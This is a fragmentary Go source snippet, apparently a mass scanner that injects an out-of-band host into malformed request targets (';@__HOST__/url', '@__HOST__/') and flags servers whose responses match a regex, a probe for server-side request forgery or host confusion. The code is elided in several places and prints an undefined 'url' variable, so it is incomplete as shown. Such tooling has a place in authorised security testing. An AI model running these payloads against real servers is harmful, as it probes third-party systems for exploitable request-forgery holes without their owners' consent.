...
func main() {
	oobHost := flag.String("h", "", "oob host")
	rg := flag.String("r", "", "regex")
	flag.Parse()
	payloads := []string{
		";@__HOST__/url",
		"@__HOST__/",
	...
	for scanner.Scan() {
		...
		go func(u string) {
			...
			Port, host, _, err := parseURL(u)
			if err == nil {
				port, _ := strconv.Atoi(Port)
				for _, p := range payloads {
					P := strings.ReplaceAll(p, "__HOST__", *oobHost)
					r2 := normalRequest("GET", P, host, port)
					if len(r2) > 1 {
						_, b2, err := splitHTTPResponse(r2)
						if err == nil {
							if strings.Contains(b2, *rg) {
								fmt.Println(url)
